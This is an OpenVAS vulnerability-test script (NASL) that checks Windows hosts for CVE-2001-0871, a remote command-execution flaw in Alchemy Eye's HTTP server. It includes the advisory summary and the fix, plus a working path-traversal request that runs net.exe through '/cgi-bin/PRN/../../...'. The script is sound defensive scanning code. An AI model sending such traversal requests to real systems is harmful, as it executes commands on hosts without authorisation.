# OpenVAS Vulnerability Test
# $Id: alchemy_eye_http.nasl 3362 2016-05-20 11:19:10Z antu123 $
# Description: Alchemy Eye HTTP Command Execution
#
# Authors:
# Drew Hintz ( http://guh.nu )
# Based on scripts written by Renaud Deraison and  HD Moore
#
# Copyright:
# Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "Alchemy Eye and Alchemy Network Monitor are network management
tools for Microsoft Windows. The product contains a built-in HTTP
server for remote monitoring and control. This HTTP server allows
arbitrary commands to be run on the server by a remote attacker.
(Taken from the security announcement by http://www.rapid7.com.)";
tag_solution = "Either disable HTTP access in Alchemy Eye, or require
authentication for Alchemy Eye. Both of these can be set in the
Alchemy Eye preferences.

More Information : http://www.securityfocus.com/archive/1/243404";

if(description)
{
 script_id(10818);
 script_version("$Revision: 3362 $");
 script_tag(name:"last_modification", value:"$Date: 2016-05-20 13:19:10 +0200 (Fri, 20 May 2016) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3599);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2001-0871");
 name = "Alchemy Eye HTTP Command Execution";
 script_name(name);
 

 summary = "Determines if arbitrary commands can be executed by Alchemy Eye";
 
 script_summary(summary);
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 script_copyright("This script is Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_keys("www/alchemy");
 script_require_ports("Services/www", 80);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "solution" , value : tag_solution);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

function check(req)
{
 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if ( r == NULL ) exit(0);
 pat = "ACCOUNTS | COMPUTER"; 
 if(pat >< r) {
   	security_message(port:port);
	exit(0);
 	}
 return(0);
}

dir[0] = "/PRN";
dir[1] = "/NUL";
dir[2] = "";

for(d=0;dir[d];d=d+1)
{
	url = string("/cgi-bin", dir[d], "/../../../../../../../../WINNT/system32/net.exe");
	check(req:url);
}



